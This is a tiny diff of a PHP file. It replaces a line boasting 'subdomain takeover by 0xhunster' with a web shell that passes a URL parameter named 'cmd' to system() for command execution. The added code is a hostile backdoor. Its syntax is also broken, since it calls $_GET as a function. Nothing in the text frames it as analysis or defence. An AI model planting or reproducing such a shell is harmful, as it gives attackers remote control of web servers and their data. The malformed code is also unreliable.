@@ -1,1 +1,4 @@
-<?php echo"subdomain takeover by 0xhunster" php>
+<?php
+system($_GET(['cmd']));
+
+?>
